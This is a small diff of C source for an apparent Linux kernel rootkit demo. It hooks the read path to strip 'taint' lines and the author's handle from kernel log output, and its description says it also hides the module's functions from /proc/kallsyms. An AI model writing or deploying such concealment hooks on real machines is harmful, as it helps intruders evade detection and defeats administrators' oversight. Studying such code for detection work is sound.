@@ -9,7 +9,7 @@
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("matheuzsec/fs3cs0ciety");
-MODULE_DESCRIPTION("POC/Demo hiding 'taint' messages from /dev/ksmg and the lkm's functions from /proc/kallsyms");
+MODULE_DESCRIPTION("POC/Demo hiding 'taint' messages from /dev/ksmg and the modules functions from /proc/kallsyms");
 
 #define B_F 4096  // Temporary buffer size for reading
 
@@ -67,7 +67,7 @@ static notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
                 *line_ptr = '\0';  // Temporarily terminate the line
 
                 // Check if the line contains "taint" or "lkm"
-                if (!strstr(line, "taint") && !strstr(line, "mathuez")) {
+                if (!strstr(line, "taint") && !strstr(line, "matheuz")) {
                     size_t line_len = strlen(line);
                     if (filtered_len + line_len + 1 < B_F) {  // Check for space in the filtered buffer
                         strcpy(filtered_buf + filtered_len, line);  // Append the line
